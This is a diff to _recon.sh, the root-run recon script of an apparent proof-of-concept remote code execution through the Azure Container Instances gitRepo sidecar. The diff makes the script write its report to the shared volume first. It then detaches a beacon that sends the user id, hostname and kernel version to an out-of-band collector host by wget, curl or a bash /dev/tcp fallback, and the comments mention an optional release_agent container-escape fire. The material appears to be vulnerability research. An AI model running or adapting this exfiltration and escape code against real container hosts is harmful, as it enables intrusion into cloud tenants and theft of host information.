@@ -1,9 +1,10 @@
 #!/bin/sh
-# _recon.sh — detached recon body for the ACI gitRepo sidecar PoC.
-# Runs OUTSIDE git's wait (see _dispatch.sh), so it may take its time without
-# hanging the container. Writes a full proof report in-band to the gitRepo volume
-# (retrievable via `az container exec cat /tmp/hooks/<OUT>`) and sends a compact
-# summary to the optional out-of-band collector as backup proof + timing.
+# _recon.sh — recon body for the ACI gitRepo sidecar PoC.
+# Called SYNCHRONOUSLY by _dispatch.sh: the local report (all fast /proc reads) is
+# written to the gitRepo VOLUME first — that file persists after the ephemeral sidecar
+# is torn down and is mounted into the user container (retrievable via az container
+# exec). Only the slow OOB GET (and the optional release_agent fire) are detached at
+# the end so they cannot delay the clone / hang the container.
 #
 # Runs as ROOT in the privileged aci-atlas-sidecar-gitrepo container.
 
@@ -96,21 +97,24 @@ for p in /mount/gitrepo /mount/gitrepo/mnt /tmp/hooks /mnt/repo /tmp; do
     cp "$WORKTREE/$OUT" "$p/$OUT" 2>/dev/null || true
 done
 
-# ── Out-of-band compact summary (backup proof + timing) ───────────────────────
+# ── Out-of-band compact summary (DETACHED — never delays the clone) ───────────
+# Backgrounded so a slow/blocked connect cannot hang the hook. The full report is
+# already durable in the volume by this point, so losing the OOB GET costs nothing.
 if [ -n "$OOB_HOST" ]; then
     who=$(id 2>/dev/null | tr ' ' '+' )
     host=$(hostname 2>/dev/null)
     kern=$(uname -r 2>/dev/null)
     nproc=$(ls -d /proc/[0-9]* 2>/dev/null | wc -l | tr -d ' ')
     q="/?poc=gitrepo-rce&id=${who}&host=${host}&kr=${kern}&nproc=${nproc}"
-    if command -v wget >/dev/null 2>&1; then
-        wget -q -T 8 -O /dev/null "http://${OOB_HOST}:${OOB_PORT}${q}" 2>/dev/null
-    elif command -v curl >/dev/null 2>&1; then
-        curl -s -m 8 -o /dev/null "http://${OOB_HOST}:${OOB_PORT}${q}" 2>/dev/null
-    else
-        # bash /dev/tcp fallback
-        bash -c "exec 3<>/dev/tcp/${OOB_HOST}/${OOB_PORT}; printf 'GET %s HTTP/1.0\r\nHost: %s\r\n\r\n' '$q' '${OOB_HOST}' >&3; cat <&3 >/dev/null" 2>/dev/null
-    fi
+    setsid /bin/sh -c '
+        if command -v wget >/dev/null 2>&1; then
+            wget -q -T 8 -O /dev/null "http://'"${OOB_HOST}:${OOB_PORT}${q}"'"
+        elif command -v curl >/dev/null 2>&1; then
+            curl -s -m 8 -o /dev/null "http://'"${OOB_HOST}:${OOB_PORT}${q}"'"
+        else
+            bash -c "exec 3<>/dev/tcp/'"${OOB_HOST}"'/'"${OOB_PORT}"'; printf \"GET '"${q}"' HTTP/1.0\r\nHost: '"${OOB_HOST}"'\r\n\r\n\" >&3; cat <&3 >/dev/null"
+        fi
+    ' </dev/null >/dev/null 2>&1 &
 fi
 
 exit 0
